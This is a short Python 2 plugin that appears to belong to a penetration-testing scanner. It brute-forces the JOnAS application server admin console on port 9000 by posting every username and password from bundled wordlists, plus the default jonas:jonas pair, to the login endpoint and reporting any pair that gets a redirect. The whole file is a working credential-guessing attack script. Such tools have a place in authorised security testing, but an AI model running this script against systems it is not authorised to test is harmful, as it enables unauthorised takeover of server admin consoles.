'''
plugin JOnAS
triggers=jonas
ports=9000
'''

import os
import sys
import httplib, urllib


def tryingCreds(ip_addr,port):
	
	
	print "[*] Trying default jonas creds on "+ ip_addr

	f_users = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/users", 'r')
	f_passwds = open(os.path.dirname(os.path.realpath(__file__))+ "/wordlists/pass", 'r')


	# For test jonas:jonas
	users = f_users.read()
	passwds = f_passwds.read()

	for user in (users +'\njonas').split('\n'):
		#user = user[:-1]
		for pwd in (passwds+'\njonas').split('\n'):
			#pwd =pwd[:-1]


			params = urllib.urlencode({'j_username' :user, 'j_password' :pwd, "j_character_encoding": "UTF-8"})
			headers = {"Content-Type": "application/x-www-form-urlencoded"}
			conn = httplib.HTTPConnection(ip_addr, port, timeout=10)

			conn.request("POST","/jonasAdmin/j_security_check", params, headers)
			res = conn.getresponse()
			if res.status == 302:
				print "[+] Creds found ! "+user+":"+pwd
			elif res.status == 404:
				print "[-] No admin console"
				return
			elif res.status == 408:
				print "[+] Creds possibly found ! "+user+":"+pwd

	print "[*] Trying done."
	

def main(ip_addr, port):
	try:
		tryingCreds(ip_addr,port)
	except Exception as e:
		print e

if __name__ == '__main__':
	main(sys.argv[1], sys.argv[2])
